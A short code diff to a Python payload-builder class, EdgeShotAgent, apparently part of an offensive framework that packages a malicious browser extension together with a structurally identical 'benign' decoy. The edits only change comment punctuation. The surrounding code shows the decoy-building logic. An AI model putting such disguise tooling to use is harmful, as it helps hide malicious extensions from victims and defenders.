@@ -647,7 +647,7 @@ class EdgeShotAgent(PayloadType):
         # browser re-registers the worker and A's cached worker is dropped.
         benign_dict = dict(manifest_dict)
         # The decoy keeps the operator's ADDONNAME/DESCRIPTION (already
-        # substituted into the malicious manifest above) — no fixed
+        # substituted into the malicious manifest above); no fixed
         # "Google Docs Offline" disguise. GAP only needs the manifest to stay
         # structurally identical (version, permissions, worker filename).
         benign_code_keyed = json.dumps(benign_dict, indent=2)
@@ -698,7 +698,7 @@ class EdgeShotAgent(PayloadType):
             zout.writestr("extension_benign/manifest.json", benign_code_keyed)
             zout.writestr("extension_benign/background.js", benign_bg_code)
             # The benign manifest is derived from the malicious one, so it also
-            # references icons/*.png — ship them so the decoy loads cleanly.
+            # references icons/*.png; ship them so the decoy loads cleanly.
             for name, data in (icons or {}).items():
                 zout.writestr(f"extension_benign/icons/{name}", data)
             zout.writestr(script_filename, script_text)
